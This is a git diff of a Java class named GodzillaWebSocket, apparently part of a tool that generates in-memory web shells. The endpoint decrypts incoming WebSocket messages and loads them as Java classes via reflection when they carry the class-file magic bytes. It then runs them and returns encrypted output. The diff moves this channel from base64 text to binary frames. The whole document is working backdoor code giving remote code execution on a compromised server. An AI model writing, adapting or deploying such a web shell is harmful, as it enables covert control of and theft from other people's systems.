@@ -12,21 +12,22 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
+import java.nio.ByteBuffer;
 
 /**
  * @author ReaJason
  * @since 2025/5/9
  */
-public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<String> {
+public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<ByteBuffer> {
     public static String key;
     private Session session;
     private static Class<?> payload;
 
     @Override
-    public void onMessage(String message) {
+    public void onMessage(ByteBuffer byteBuffer) {
         byte[] result = null;
         try {
-            byte[] data = base64Decode(message);
+            byte[] data = byteBuffer.array();
             data = x(data, false);
             if (payload == null || (data[0] == -54 && data[1] == -2)) {
                 payload = reflectionDefineClass(data);
@@ -44,7 +45,7 @@ public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<
             result = getErrorMessage(e).getBytes();
         }
         try {
-            session.getBasicRemote().sendText(base64Encode(x(result, true)));
+            session.getBasicRemote().sendBinary(ByteBuffer.wrap(x(result, true)));
         } catch (Exception ignored) {
         }
     }
@@ -81,28 +82,6 @@ public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<
     public void onOpen(final Session session, EndpointConfig config) {
         this.session = session;
         session.addMessageHandler(this);
-    }
-
-    @SuppressWarnings("all")
-    public static String base64Encode(byte[] bs) throws Exception {
-        try {
-            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
-            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
-        } catch (Exception var6) {
-            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
-            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
-        }
-    }
-
-    @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) throws Exception {
-        try {
-            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
-            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
-        } catch (Exception var6) {
-            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
-            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-        }
     }
 
     public byte[] x(byte[] s, boolean m) throws Exception {
